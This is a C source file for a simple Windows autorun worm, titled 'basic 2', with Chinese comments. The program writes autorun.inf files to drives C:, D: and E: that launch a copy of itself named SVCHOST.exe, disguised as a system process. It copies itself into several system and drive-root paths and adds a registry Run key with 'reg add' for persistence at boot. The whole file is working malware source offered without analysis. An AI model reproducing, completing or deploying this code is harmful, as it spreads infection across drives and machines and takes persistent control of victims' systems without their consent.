/**
 * basic 2
 * @author unknown
 */

#define SVCHOST_NUM 6
#include<stdio.h>
#include<string.h>
char *autorun = {"[autorun]\nopen=SVCHOST.exe\n\nshell\\1=打开\nshell\\1\\Command=SVCHOST.exe\nshell\\2\\=Open\nshell\\2\\Command=SVCHOST.exe\nshellexecute=SVCHOST.exe"};
char *files_autorun[10] = {"c:\\autorun.inf","d:\\autorun.inf","e:\\autorun.inf"};
char *files_svchost[SVCHOST_NUM+1] = {"c:\\windows\\system\\MSMOUSE.DLL", "c:\\windows\\system\\SVCHOST.exe","c:\\windows\\SVCHOST.exe", "c:\\SVCHOST.exe","d:\\SVCHOST.exe","e:\\SVCHOST.exe","SVCHOST.exe"};
char *regadd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SVCHOST /d C:\\Windows\\system\\SVCHOST.exe /f";

/**
 * 复制文件
 * @param {*} 复制源
 * @param {*} 目的地
 * @return 成功返回0，失败返回1
*/ 
int copy(char *infile,char *outfile)
{
  FILE *input,*output;
  char temp;
  
  if(strcmp(infile,outfile)!=0 && ((input=fopen(infile,"rb"))!=NULL) && ((output=fopen(outfile,"wb"))!=NULL))
  {
    while(!feof(input))
    {
      fread(&temp,1,1,input);
      fwrite(&temp,1,1,output);
    }

    fclose(input);
    fclose(output);
    return 0;
  }

  else return 1;
}

/**
 * 主程序
 * @return none
 */ 
int main (void)
{
  FILE *input, *output;
  int i, k;
  
  for(i=0;i<3;i++)
  {
    output=fopen(files_autorun[i],"w");
    fprintf(output,"%s",autorun);
    fclose(output);
  }
  
  for(i=0;i<=SVCHOST_NUM;i++)
  { 
    if((input=fopen(files_svchost[i],"rb"))!=NULL)
    {
      fclose(input);
      for(k=0;k<SVCHOST_NUM;k++)
      {
        copy(files_svchost[i],files_svchost[k]);
      }
      i=SVCHOST_NUM+1;
    }
  }

  system(regadd);
  return 0;
}